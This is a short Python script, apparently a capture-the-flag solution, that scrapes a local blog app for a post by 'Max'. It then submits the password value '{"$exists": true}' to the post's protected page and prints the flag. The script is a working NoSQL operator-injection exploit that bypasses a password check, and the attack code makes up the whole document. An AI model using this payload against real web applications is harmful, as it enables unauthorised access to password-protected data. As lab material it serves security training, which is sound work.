from bs4 import BeautifulSoup, element
import requests

host = "http://localhost:8011"

# grab the post with the author of Max
response = requests.get(host)
soup = BeautifulSoup(response.text, 'html.parser')
divs = soup.find_all("div", {"class": "postlink"})
max_post = divs[3]
max_post: element.Tag
post_url = max_post.find("a").get("href")

print("[#] Sending exploit")
flag_page = requests.post(f"{host}{post_url}", data={
    "password": '{"$exists": true}'
})
flag_page_soup = BeautifulSoup(flag_page.text, 'html.parser')
print("[@] Grabbing flag")
print(flag_page_soup.find_all("p")[1].text.strip())